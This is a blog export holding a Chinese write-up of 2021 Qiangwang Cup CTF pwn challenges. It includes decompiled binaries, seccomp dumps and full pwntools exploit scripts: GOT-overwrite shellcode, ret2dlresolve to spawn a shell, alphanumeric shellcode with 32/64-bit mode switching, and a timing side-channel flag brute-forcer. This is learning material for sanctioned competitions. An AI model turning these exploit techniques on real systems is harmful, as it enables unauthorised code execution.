{"meta":{"title":"Hexo","subtitle":"","description":"","author":"John Doe","url":"http://example.com","root":"/"},"pages":[],"posts":[{"title":"2021强网杯pwn复现","slug":"2021强网杯pwn复现","date":"2021-10-08T16:55:04.000Z","updated":"2021-10-08T17:37:50.398Z","comments":true,"path":"2021/10/09/2021强网杯pwn复现/","link":"","permalink":"http://example.com/2021/10/09/2021%E5%BC%BA%E7%BD%91%E6%9D%AFpwn%E5%A4%8D%E7%8E%B0/","excerpt":"2021强网杯pwn 参考链接：https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/ [强网先锋]orw 查看程序，基本全是7的权限，所以说shellcode往哪里写都可以：","text":"2021强网杯pwn 参考链接：https://a1ex.online/2021/06/25/2021-QWB%E9%A2%98%E8%A7%A3/ [强网先锋]orw 查看程序，基本全是7的权限，所以说shellcode往哪里写都可以： 12345678secc@ubuntu:~/Desktop$ checksec pwn[*] &#x27;/home/secc/Desktop/pwn&#x27; Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: PIE enabled RWX: Has RWX segments 临时修改共享库可以使用如下命令： 1export LD_PRELOAD=/home/secc/Desktop/libseccomp.so.0 查看沙盒，发现限制了只能使用open、read、write函数，这道题应该是个orw： 123456789101112131415161718192021222324secc@ubuntu:~/Desktop$ seccomp-tools dump ./pwn..#######..##......##.########..##.....##.##..##..##.##.....##.##.....##.##..##..##.##.....##.##.....##.##..##..##.########..##..##.##.##..##..##.##.....##.##....##..##..##..##.##.....##..#####.##..###..###..########.It&#x27;s easy .Just hack for fun~! line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x05 0xffffffff if (A != 0xffffffff) goto 0010 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000001 if (A == write) goto 0009 0007: 0x15 0x01 0x00 0x00000002 if (A == open) goto 0009 0008: 0x15 0x00 0x01 0x0000003c if (A != exit) goto 0010 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL 反编译程序，是一道菜单题，只有add和free两个函数。首先来看看函数，这里没有限制索引为负数： 12345678910111213141516171819202122232425__int64 sub_E44()&#123; int v1; // [rsp+0h] [rbp-10h] int v2; // [rsp+4h] [rbp-Ch] if ( qword_202130 &lt;= 1 ) &#123; puts(&quot;index:&quot;); v1 = sub_DFA(); puts(&quot;size:&quot;); v2 = sub_DFA(); if ( v2 &gt;= 0 &amp;&amp; v2 &lt;= 8 &amp;&amp; v1 &lt;= 1 ) // 只限制了索引小于1，存在数组越界 &#123; qword_2020E0[v1] = malloc(v2); if ( !qword_2020E0[v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; puts(&quot;content:&quot;); sub_D8E(qword_2020E0[v1], v2); ++qword_202130; &#125; &#125; return qword_202130; free函数比较正常： 12345678910111213141516__int64 sub_F8E()&#123; __int64 result; // rax int v1; // [rsp+Ch] [rbp-14h] result = qword_202138; if ( qword_202138 &lt;= 0 ) &#123; puts(&quot;index:&quot;); v1 = sub_DFA(); free((void *)qword_2020E0[v1]); qword_2020E0[v1] = 0LL; return ++qword_202138; &#125; return result;&#125; myread函数，存在任意长度写： 12345678910111213141516171819__int64 __fastcall sub_D8E(_BYTE *a1, __int64 a2)&#123; _BYTE *buf; // [rsp+8h] [rbp-18h] unsigned int v4; // [rsp+14h] [rbp-Ch] buf = a1; v4 = 0; while ( 1 ) &#123; read(0, buf, 1uLL); // 首先读入一个字节，让v4加1，此时v4已经等于1了 ++v4; if ( *buf == 10 ) break; if ( ++buf == &amp;a1[a2] ) return v4; // 如果伪造v4为0的话，这里的判断永远不会成立，所以存在任意长度写 &#125; *buf = 0; return v4;&#125; 思路： 使用负索引，可以修改got表。 往got表的libc地址内写入shellcode，最后触发执行。 脚本： 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(log_level = &#x27;debug&#x27;, os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)sh = process(&#x27;./orw&#x27;)sh = remote(&#x27;39.105.131.68&#x27;,12354)elf = ELF(&#x27;./orw&#x27;)libc = elf.libcshellcode=&#x27;&#x27;&#x27;xor rsi, rsimov rax, 2mov rdi, 0x67616c662fpush rdimov rdi, rspsyscallmov rdx, 0x100mov rsi, rdimov rdi, raxxor rax, raxsyscallmov rdi, 1mov rax, 1syscall&#x27;&#x27;&#x27;sh.recv()sh.sendline(&#x27;1&#x27;)sh.recvuntil(&#x27;index:&#x27;)sh.sendline(&#x27;-25&#x27;)# gdb.attach(sh, &#x27;init-pwndbg\\nb *$rebase(0x0000E90)&#x27;)sh.recvuntil(&#x27;size:&#x27;)sh.sendline(&#x27;&#x27;) # 填0也可以sh.recvuntil(&#x27;content:&#x27;)sh.sendline(asm(shellcode))sh.recv()sh.sendline(&#x27;4&#x27;)sh.recv()sh.sendline(&#x27;1&#x27;)sh.interactive() 另一种思路： 改写atoi为jmp rdi，这样就可以利用atoi的缓冲区写入shellcode。 通过16字节的shellcode写入更大的shellcode，完成orw。且可以后一个shellcode可以读入栈中，使用rbp寄存器。 123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;)sh = process(&#x27;./pwn&#x27;)elf = ELF(&#x27;./pwn&#x27;)libc = elf.libcdef choice(cho): sh.sendlineafter(&#x27;choice &gt;&gt;&#x27;, str(cho))def add(idx, size, content): choice(1) sh.sendlineafter(&#x27;index&#x27;, str(idx)) sh.sendlineafter(&#x27;size&#x27;, str(size)) sh.sendlineafter(&#x27;content&#x27;, content)def free(idx): choice(4) sh.sendlineafter(&#x27;index&#x27;, str(idx))shellcode = asm(&#x27;&#x27;&#x27;xor rax, raxmov dl, 0x80mov rsi, rbppush raxpop rdisyscalljmp rbp&#x27;&#x27;&#x27;)print(len(shellcode))add(0, 8, &#x27;flag&#x27;)free(0)pause()add(-14, 8, asm(&#x27;jmp rdi&#x27;)) # atoish.sendline(shellcode)shellcode = shellcraft.pushstr(&#x27;/flag&#x27;)shellcode += shellcraft.open(&#x27;rsp&#x27;)shellcode += shellcraft.read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 100)shellcode += shellcraft.write(1, &#x27;rsp&#x27;, 100)sh.send(asm(shellcode))sh.interactive() [强网先锋]no_output 使用IDA反编译程序： 123456789101112131415161718192021int sub_8049424()&#123; int result; // eax char src[32]; // [esp+Ch] [ebp-5Ch] BYREF char buf[48]; // [esp+2Ch] [ebp-3Ch] BYREF const char *v3; // [esp+5Ch] [ebp-Ch] sub_804930B(); v3 = &quot;tell me some thing&quot;; read(0, buf, 0x30u); v3 = &quot;Tell me your name:\\n&quot;; read(0, src, 0x20u); sub_80493EC(src); strcpy(dest, src); v3 = &quot;now give you the flag\\n&quot;; read(unk_804C080, src, 0x10u); // 读取本地文件中的字符串 result = sub_8049385(src, off_804C034); // 字符串比较，off_804C034为hello_boy if ( !result ) return sub_8049269(); // 比较成功后进入函数 return result;&#125; 看一下sub_804930B初始化函数： 1234567891011int sub_804930B()&#123; int result; // eax setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); result = open(&quot;real_flag.txt&quot;, 1); unk_804C080 = result; return result;&#125; 来看到sub_8049269函数： 1234567891011121314151617181920__sighandler_t sub_8049269()&#123; __sighandler_t result; // eax void (*v1)(int); // [esp+0h] [ebp-18h] BYREF int v2[2]; // [esp+4h] [ebp-14h] BYREF const char *v3; // [esp+Ch] [ebp-Ch] v3 = &quot;give me the soul:&quot;; __isoc99_scanf(&quot;%d&quot;, v2); v3 = &quot;give me the egg:&quot;; __isoc99_scanf(&quot;%d&quot;, &amp;v1); result = v1; if ( v1 ) &#123; signal(8, (__sighandler_t)sub_8049236); // set handler，SIGFPE表示一个算数运算异常 v2[1] = v2[0] / (int)v1; // sub_8049236为漏洞函数 return signal(8, 0); &#125; return result;&#125; 学习一下signal函数： 1sighandler_t signal(int signum, sighandler_t handler); 参数signum指明了所要处理的信号类型，它可以取除了SIGKILL和SIGSTOP外的任何一种信号。 题目中SIGFPE即常量8，为数学相关的异常，如被0除，浮点溢出，等等。 看到sub_8049236漏洞函数，这里就是简单的栈溢出了： 123456ssize_t sub_8049236()&#123; char buf[68]; // [esp+0h] [ebp-48h] BYREF return read(0, buf, 0x100u);&#125; 思路： 由于存在strcpy(dest, src);该函数存在1位的溢出，会在拷贝的最后一位后加上\\x00，且刚好看到读入的fd指针就在dest全局变量的后面。那么我们可以通过这一位的溢出，将fd指针修改为\\x00，那么read函数也就变成了读入输入的字符，那么我们就可以控制src了。 触发算数运算异常才能运行后门函数，但是if (v1)限制了v1不能为0，那么我们就来构造溢出，我们输入比-2147483648更小的数，由于scanf函数的特性，最终都是识别成0x80000000。输入v1为-1，$-2147483648\\div-1=2147483648$，但是2147483648超出了符号int数的大小范围，会导致算数运算异常。 sub_8049236函数内是简单的堆溢出，由于本题中没有输出，所以使用dl_runtime_resolve攻击。 形成脚本（ret2dlresolve的思路大致理清楚了，后面再学）： 注意read函数取消输入不仅可以通过换行字符，也可以通过时间停滞。 123456789101112131415161718192021222324from pwn import *context(log_level = &#x27;debug&#x27;, endian = &#x27;little&#x27;, arch = &#x27;i386&#x27;)sh = process(&#x27;./test&#x27;)elf = ELF(&#x27;./test&#x27;)sh.send(&#x27;\\x00&#x27;)sleep(0.1) # raw_input(&#x27;&gt;&#x27;)sh.send(&#x27;a&#x27; * 0x20)sleep(0.1)sh.send(&#x27;hello_boy\\x00&#x27;)sh.sendline(str(-0x80000000))sh.sendline(str(-1))rop = ROP(&quot;./test&quot;)dlresolve = Ret2dlresolvePayload(elf, symbol = &#x27;system&#x27;, args=[&#x27;/bin/sh&#x27;])rop.read(0, dlresolve.data_addr)rop.ret2dlresolve(dlresolve)info(rop.dump())sh.sendline(fit(&#123;0x4C: rop.chain(), 0x100: dlresolve.payload&#125;))sh.interactive() [强网先锋]shellcode 参考链接：https://www.cnblogs.com/countfatcode/p/11756258.htmlhttps://n0va-scy.github.io/2020/06/21/shellcode%E7%9A%84%E8%89%BA%E6%9C%AF/https://lingze.xyz/pages/07df2e/ 查看沙盒： 123456789101112secc@ubuntu:~/Desktop$ seccomp-tools dump ./shellcode line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000000 A = sys_number 0001: 0x15 0x06 0x00 0x00000005 if (A == fstat) goto 0008 0002: 0x15 0x05 0x00 0x00000025 if (A == alarm) goto 0008 0003: 0x15 0x03 0x00 0x00000004 if (A == stat) goto 0007 0004: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0008 0005: 0x15 0x02 0x00 0x00000009 if (A == mmap) goto 0008 0006: 0x15 0x01 0x00 0x000000e7 if (A == exit_group) goto 0008 0007: 0x06 0x00 0x00 0x00000000 return KILL 0008: 0x06 0x00 0x00 0x7fff0000 return ALLOW IDA反编译程序，查看主函数，主程序是入读shellcode并执行： 12345678910111213141516171819 v0 = sys_alarm(0x3Cu); v1 = sys_prctl(38, 1uLL, 0LL, 0LL); v3 = sys_prctl(22, 2uLL, (unsigned __int64)arg3, v2); v4 = (char *)sys_mmap(0LL, 0x1000uLL, 7uLL, 0x22uLL, 0xFFFFFFFFuLL, 0LL); v5 = sys_read(0, v4, 0x1000uLL); v6 = v5; if ( v4[(int)v5 - 1] == 10 ) &#123; v4[(int)v5 - 1] = 0; v6 = v5 - 1; &#125; for ( i = 0; i &lt; v6; ++i ) &#123; if ( v4[i] &lt;= 31 || v4[i] == 127 ) // 限制读入的字符为可见字符串 goto LABEL_10; &#125; ((void (*)(void))v4)(); // 调用shellcodeLABEL_10: v8 = sys_exit_group(0); retfq指令的栈布局为： ret（位于sp）：接下来要执行的地址。 set cs（位于sp+4/8）：切换到64位系统下，参数值为0x33；切换到32位系统下，参数值为0x23。 需要的注意的是，在由64位变为32位后，rsp的值会变成非法值，故需先修复rsp的值在执行相应的代码（即mov esp, 0x40404550）。 shellcode 编写一个测试程序如下，并使用gcc main.c -z execstack -o main命令编译，编译为32位需加上-m32： 1234567#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; execve(&quot;/bin/sh&quot;, 0, 0); return 0; &#125; 使用objdump打印出intel架构下的main函数，发现直接调用了链接库函数，这种方法行不通。 1234567891011secc@ubuntu:~/Desktop$ objdump -M intel -d a.out | grep &#x27;&lt;main&gt;&#x27; -A 100000000000400430 &lt;main&gt;: 400430: 48 83 ec 08 sub rsp,0x8 400434: 31 d2 xor edx,edx 400436: 31 f6 xor esi,esi 400438: bf d4 05 40 00 mov edi,0x4005d4 40043d: e8 ce ff ff ff call 400410 &lt;execve@plt&gt; 400442: 31 c0 xor eax,eax 400444: 48 83 c4 08 add rsp,0x8 400448: c3 ret 400449: 0f 1f 80 00 00 00 00 nop DWORD PTR [rax+0x0] gdb反汇编execve函数的代码： 1234567pwndbg&gt; disassemble execveDump of assembler code for function execve: 0x00007ffff78937f0 &lt;+0&gt;: mov eax,0x3b 0x00007ffff78937f5 &lt;+5&gt;: syscall 0x00007ffff78937f7 &lt;+7&gt;: cmp rax,0xfffffffffffff001 0x00007ffff78937fd &lt;+13&gt;: jae 0x7ffff7893800 &lt;execve+16&gt; 0x00007ffff78937ff &lt;+15&gt;: ret 仿照上面写出代码（将字符串/bin/sh\\x00压栈之后，又把栈地址赋值给rdi）： 1234567mov rdx, 0mov rsi, 0mov rdi, 0x68732f6e69622f push rdimov rdi, rspmov eax, 0x3bsyscall 优化选项（长度为0xc）： 12345678910mov al, 59push rbxpush rbxpop rsipop rdxmov rdi, 0x68732f6e69622fpush rdipush rsppop rdisyscall 继续题解 查看32位和64位的系统调用号：https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md 系统调用号 x86 x64 5 open fstat 37 kill alarm 4 write stat 0 restart_syscall read 9 link mmap 231 fgetxattr exit_group mmap调用 的shellcode： 12345678910111213141516171819202122232425262728293031323334353637383940code_mmap = asm(&#x27;&#x27;&#x27; /*mov rdi, 0x40404040*/ push 0x40404040 pop rdi /*mov rsi, 0x7e*/ push 0x7e pop rsi /*mov rdx, 0x7*/ push 0x37 pop rax xor al, 0x30 push rax pop rdx /*mov r8, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop r8 /*mov r9, 0*/ push rax pop r9 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x2c], cl push 0x5c pop rcx xor byte ptr [rbx+0x2d], cl /*mov rax, 0x9*/ push 0x39 pop rax xor al, 0x30&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) read调用的shellcode： 1234567891011121314151617181920212223242526272829code_read = asm(&#x27;&#x27;&#x27; /*mov rsi, 0x40404040*/ push 0x40404040 pop rsi /*mov rdi, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop rdi /*mov rdx, 0x7e*/ push 0x7e pop rdx /*mov rax, 0*/ push 0x30 pop rax xor al, 0x30 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x4f], cl push 0x5c pop rcx xor byte ptr [rbx+0x50], cl&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) retfq指令的shellcode： 1234567891011121314151617181920212223code_retfq = asm(&#x27;&#x27;&#x27; /* 算出0x48 */ push 0x39 pop rcx xor byte ptr [rbx + 0x71], cl push 0x20 pop rcx xor byte ptr [rbx + 0x71], cl /* * 利用无借位减法算出0xcb */ push 0x47 pop rcx sub byte ptr [rbx + 0x72], cl sub byte ptr [rbx + 0x72], cl push rdi push rdi push 0x23 push 0x40404040 pop rax push rax&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) open调用的shellcode（32位下）： 1234567891011code_open = asm(&#x27;&#x27;&#x27; /* open函数 */ mov esp, 0x40404550 push 0x67616c66 /* flag */ mov ebx, esp xor ecx, ecx xor edx, edx mov eax, 0x5 int 0x80 mov ecx, eax&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) retfq从32位转回64位的shellcode： 123456code_retfq_1 = asm(&#x27;&#x27;&#x27; /* retfq */ push 0x33 push 0x40404062 /* 具体数字有待修改 */ retfq&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) read的shellcode（64位下）： 1234567code_read = asm(&#x27;&#x27;&#x27; mov rdi,rcx mov rsi,rsp mov rdx,0x70 xor rax,rax syscall&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) append的shelllcode（64位下）： 1234code_append = asm(&#x27;&#x27;&#x27; push rcx pop rcx&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) append的shelllcode（32位下）： 1234code_append_x86 = asm(&#x27;&#x27;&#x27; push ebx pop ebx&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) 侧信道攻击： 1234if index == 0: shellcode_flag += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(index, ch)else: shellcode_flag += &quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(index, ch) 最后形成脚本（注意自己调用read的时候是不需要使用可见字符的shellcode的）： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180#-*- coding:utf8 -*-from pwn import *code_append = asm(&#x27;&#x27;&#x27; push rcx pop rcx&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_append_x86 = asm(&#x27;&#x27;&#x27; push ebx pop ebx&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)code_mmap = asm(&#x27;&#x27;&#x27; /*mov rdi, 0x40404040*/ push 0x40404040 pop rdi /*mov rsi, 0x7e*/ push 0x7e pop rsi /*mov rdx, 0x7*/ push 0x37 pop rax xor al, 0x30 push rax pop rdx /*mov r8, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop r8 /*mov r9, 0*/ push rax pop r9 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x2c], cl push 0x5c pop rcx xor byte ptr [rbx+0x2d], cl /*mov rax, 0x9*/ push 0x39 pop rax xor al, 0x30&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_read = asm(&#x27;&#x27;&#x27; /*mov rsi, 0x40404040*/ push 0x40404040 pop rsi /*mov rdi, 0*/ push 0x30 pop rax xor al, 0x30 push rax pop rdi /*mov rdx, 0x7e*/ push 0x7e pop rdx /*mov rax, 0*/ push 0x30 pop rax xor al, 0x30 /*syscall*/ push 0x5e pop rcx xor byte ptr [rbx+0x4f], cl push 0x5c pop rcx xor byte ptr [rbx+0x50], cl&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_retfq = asm(&#x27;&#x27;&#x27; /* 算出0x48 */ push 0x39 pop rcx xor byte ptr [rbx + 0x71], cl push 0x20 pop rcx xor byte ptr [rbx + 0x71], cl /* 利用无借位减法算出0xcb */ push 0x47 pop rcx sub byte ptr [rbx + 0x72], cl sub byte ptr [rbx + 0x72], cl push rdi push rdi push 0x23 push 0x40404040 pop rax push rax&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)code_open = asm(&#x27;&#x27;&#x27; /* open函数 */ mov esp, 0x40404550 push 0x67616c66 /* flag */ mov ebx, esp xor ecx, ecx xor edx, edx mov eax, 0x5 int 0x80 mov ecx, eax&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;)code_retfq_back = asm(&#x27;&#x27;&#x27; /* retfq */ push 0x33 push 0x40404064 /* 具体数字有待修改 */ retfq&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)shellcode_read_flag = asm(&#x27;&#x27;&#x27; /*read(fp,buf,0x70)*/ mov rdi,rcx mov rsi,rsp mov rdx,0x70 xor rax,rax syscall&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)def pwn(sh, index, ch): shellcode = &#x27;&#x27; shellcode += code_mmap shellcode += code_append shellcode += code_read shellcode += code_append shellcode += code_retfq shellcode += code_append sh.sendline(shellcode) shellcode2 = &#x27;&#x27; shellcode2 += code_open shellcode2 += code_append shellcode2 += code_retfq_back shellcode2 += shellcode_read_flag if index == 0: shellcode2 += asm(&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-3; ret&quot;.format(index, ch), arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) else: shellcode2 += asm(&quot;cmp byte ptr[rsi+&#123;0&#125;], &#123;1&#125;; jz $-4; ret&quot;.format(index, ch), arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;) sh.sendline(shellcode2)index = 0t = []while True: for ch in range(0x20, 0x7f): # sh = remote(&#x27;39.105.137.118&#x27;, 50050) sh = process(&#x27;./shellcode&#x27;) pwn(sh, index, ch) start = time.time() try: sh.recv(timeout=2) except: pass end = time.time() sh.close() if end - start &gt; 1.5: t.append(ch) print(&quot;&quot;.join([chr(i) for i in t])) break else: print(&quot;&quot;.join([chr(i) for i in t])) break index = index + 1 print(t)log.success(&quot;&quot;.join([chr(i) for i in t])) 这道题我后来想再切到32位进行write调用，后来发现是我看错了=-=。这里当调用号为4的时候，返回的是kill，所以我怎么样都没有办法获得输出： 10003: 0x15 0x03 0x00 0x00000004 if (A == stat) goto 0007 不过呢，经过调试也是有一定的收获的： 遇到不能执行的系统调用，gdb会返回： 12Program terminated with signal SIGSYS, Bad system call.The program no longer exists. 在调试的过程中，切到32位但是gdb并不会显示正确，如下所示32位架构下，eax为4，系统调用应该为SYS_write，但是gdb还是显示的是SYS_stat，可能这和gdb的版本有关系吧。 12345670x4040407f mov ebx, 10x40404084 mov ecx, 0x4040454c0x40404089 mov edx, 0x200x4040408e mov eax, 40x40404093 int 0x80 &lt;SYS_stat&gt; file: 0x3 buf: 0x4040454c ◂— insb byte ptr [rdi], dx /* 0x3332317b67616c66; &#x27;flag&#123;123456&#125;\\n&#x27; */ 补充retfq切换到32位和write调用的shellcode： 123456789101112131415161718code_retfq2 = asm(&#x27;&#x27;&#x27; /* retfq */ push 0x23 push 0x4040407f retfq&#x27;&#x27;&#x27;, arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;)print(len(code_retfq2))# code_write = asm(shellcraft.write(1, 0x4040454c, 100), arch = &#x27;i386&#x27;)code_write = asm(&#x27;&#x27;&#x27; /* write */ mov ebx, 1 /* 文件描述符 */ mov ecx, 0x4040454c /* flag地址 */ mov edx, 0x20 /* 打印的数据长度 */ mov eax, 0x4 /* 系统调用号 */ int 0x80&#x27;&#x27;&#x27;, arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;) alpha3 我们也可以用alpha3项目来完成第一步： 1git clone https://github.com/TaQini/alpha3.git 首先生成shellcode： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import * context.arch = &#x27;amd64&#x27;def f(sc): return asm(sc, os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;)code_read = f(&#x27;&#x27;&#x27;mov rsi, 0x40404040;pushw 0x1010;pop rdx;xor rdi, rdi;xor rax, rax;syscall;&#x27;&#x27;&#x27;)# mmap(0x40404040, 0xff, 7, 34, 0, 0) ax=9code_mmap = f(&#x27;&#x27;&#x27;mov rdi, 0x40404040;push 0x7f;pop rsi;push 7;pop rdx;push 34;pop rcx;xor r8, r8;xor r9, r9;push 9;pop rax;syscall;&#x27;&#x27;&#x27;)code_rsp = f(&#x27;&#x27;&#x27;mov rsp, 0x40404f40&#x27;&#x27;&#x27;)code_retfq = f(&#x27;&#x27;&#x27;push 0x23;push 0x40404040;retfq&#x27;&#x27;&#x27;)shellcode = code_mmap + code_read + code_rsp + code_retfqfp = open(&#x27;sc&#x27;, &#x27;wb&#x27;)fp.write(shellcode)fp.close() 然后使用alpha3生成可见字符（为什么是rbx呢，因为shellcode调用指令是call rbx）： 1python ALPHA3.py x64 ascii mixedcase rbx --input=&#x27;/home/secc/Desktop/sc&#x27; 1Sh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M153f3b0s2F0s2B0Z2l0l2L072I0X1P0i2w134l1M1m3k2F090o7m0L0x5o3g2p0p2I0r2q0Y2C2D060y1L8N2E124k7m0C0x3n3d2O0x2M0p2F2s2p0u2O0s2G0z5K00 这样我们第一次发送的payload就可以替换成以上字符串了。 babypwn 查看沙盒： 123456789101112131415secc@ubuntu:~/Desktop$ seccomp-tools dump ./babypwn 1.add2.delete3.edit4.show line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x05 0xc000003e if (A != ARCH_X86_64) goto 0007 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A &lt; 0x40000000) goto 0005 0004: 0x15 0x00 0x02 0xffffffff if (A != 0xffffffff) goto 0007 0005: 0x15 0x01 0x00 0x0000003b if (A == execve) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0007: 0x06 0x00 0x00 0x00000000 return KILL 打开IDA反编译程序： 1234567891011121314151617181920212223242526272829303132void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; int v3; // eax sub_C54(a1, a2, a3); while ( 1 ) &#123; while ( 1 ) &#123; puts(&quot;&gt;&gt;&gt; &quot;); v3 = sub_BEF(); if ( v3 != 2 ) break; sub_DD9(); &#125; if ( v3 &gt; 2 ) &#123; if ( v3 == 3 ) &#123; sub_EE3(); &#125; else if ( v3 == 4 ) &#123; sub_103A(); &#125; &#125; else if ( v3 == 1 ) &#123; sub_CDB(); &#125; &#125;&#125; add函数： 123456789101112131415161718192021&#123; int i; // [rsp+4h] [rbp-Ch] size_t size; // [rsp+8h] [rbp-8h] for ( i = 0; i &lt;= 16 &amp;&amp; (*((_QWORD *)&amp;unk_202060 + 2 * i) || qword_202068[2 * i]); ++i ) // 限制只能同时申请16个堆 ; if ( i == 17 ) &#123; puts(&quot;error&quot;); exit(0); &#125; puts(&quot;size:&quot;); size = (int)sub_BEF(); if ( size &gt; 0x200 ) &#123; puts(&quot;error&quot;); exit(0); &#125; *((_QWORD *)&amp;unk_202060 + 2 * i) = malloc(size); // 申请大小 qword_202068[2 * i] = size; return puts(&quot;done&quot;); edit函数： 12345678910111213141516int sub_EE3()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] puts(&quot;index:&quot;); v1 = (int)sub_BEF(); if ( v1 &gt; 0x10 || !*((_QWORD *)&amp;unk_202060 + 2 * v1) || !qword_202068[2 * v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; puts(&quot;content:&quot;); read(0, *((void **)&amp;unk_202060 + 2 * v1), qword_202068[2 * v1]); // 读入时没有截断，可能存在地址泄露 sub_EB1(*((_QWORD *)&amp;unk_202060 + 2 * v1)); // 这里就是检测函数 return puts(&quot;done&quot;);&#125; 跟进sub_EB1检测函数： 12345678910111213141516171819unsigned __int64 __fastcall sub_EB1(_BYTE *a1)&#123; unsigned __int64 result; // rax while ( 1 ) &#123; result = (unsigned __int8)*a1; if ( !(_BYTE)result ) break; if ( *a1 == 0x11 ) // 遇到0x11的时候，停止并将该字符替换为0 &#123; result = (unsigned __int64)a1; *a1 = 0; return result; &#125; ++a1; &#125; return result;&#125; show函数： 123456789101112131415int sub_103A()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] puts(&quot;index:&quot;); v1 = (int)sub_BEF(); if ( v1 &gt; 0x10 || !*((_QWORD *)&amp;unk_202060 + 2 * v1) || !qword_202068[2 * v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; sub_FCC(**((unsigned int **)&amp;unk_202060 + 2 * v1)); sub_FCC(*(unsigned int *)(*((_QWORD *)&amp;unk_202060 + 2 * v1) + 4LL)); return puts(&quot;done&quot;);&#125; 跟进sub_FCC函数，输出的时候会对内容进行异或操作： 1234567int __fastcall sub_FCC(unsigned int a1)&#123; int i; // [rsp+1Ch] [rbp-4h] for ( i = 2; i &gt; 0; --i ) a1 ^= (32 * a1) ^ ((a1 ^ (32 * a1)) &gt;&gt; 17) ^ (((32 * a1) ^ a1 ^ ((a1 ^ (32 * a1)) &gt;&gt; 17)) &lt;&lt; 13); return printf(&quot;%lx\\n&quot;, a1); free函数： 12345678910111213141516int sub_DD9()&#123; unsigned __int64 v1; // [rsp+8h] [rbp-8h] puts(&quot;index:&quot;); v1 = (int)sub_BEF(); if ( v1 &gt; 0x10 || !*((_QWORD *)&amp;unk_202060 + 2 * v1) || !qword_202068[2 * v1] ) &#123; puts(&quot;error&quot;); exit(0); &#125; free(*((void **)&amp;unk_202060 + 2 * v1)); *((_QWORD *)&amp;unk_202060 + 2 * v1) = 0LL; qword_202068[2 * v1] = 0LL; return puts(&quot;done&quot;);&#125; 思路： 申请一个0x200大小的堆块，这样它的header为0x211。通过sub_EB1检测函数中的替换功能，可以将堆块header头的\\x11替换为\\x00，这样就类似于off by null了。 使用z3解决输出的加密后，泄露libc和heap地址。 